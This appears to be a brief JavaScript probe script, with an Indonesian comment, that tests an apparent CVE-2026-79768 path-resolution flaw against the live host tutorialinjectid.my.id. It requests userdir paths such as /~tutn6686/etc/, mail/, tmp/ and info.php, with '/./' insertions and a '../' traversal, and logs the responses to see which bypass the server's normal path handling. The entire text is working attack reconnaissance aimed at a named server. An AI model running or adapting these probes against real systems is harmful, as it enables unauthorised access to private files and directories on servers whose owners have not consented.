import { makeClient } from './lib.mjs';
const c = makeClient('https://tutorialinjectid.my.id');
// CVE-2026-79768 proxy test: apakah '/./' setelah /~user/ mengubah resolusi?
const t=['/~tutn6686/etc/','/~tutn6686/./etc/','/~tutn6686/mail/','/~tutn6686/./mail/','/~tutn6686/tmp/','/~tutn6686/./tmp/',
 '/~tutn6686/index.php','/~tutn6686/./index.php','/~tutn6686/nonaktif','/~tutn6686/./nonaktif','/~tutn6686/./../~tutn6686/info.php'];
for (const p of t){ try{const r=await c.get(p);console.log(String(r.status).padEnd(4),String((r.body||'').length).padStart(6),p);}catch(e){console.log('ERR',p,e.message);} }
